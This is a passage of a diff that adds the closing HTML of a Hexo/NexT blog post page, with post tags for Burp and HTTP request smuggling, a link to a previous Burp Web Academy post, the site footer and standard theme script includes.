+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Burp/" rel="tag"># Burp</a>
+              <a href="/tags/HTTP-Request-Smuggling/" rel="tag"># HTTP Request Smuggling</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/01/18/burp-web-academy-authentication-part2/" rel="prev" title="Burp Web Academy 鉴权漏洞（二）">
+                  <i class="fa fa-angle-left"></i> Burp Web Academy 鉴权漏洞（二）
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Livermore</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
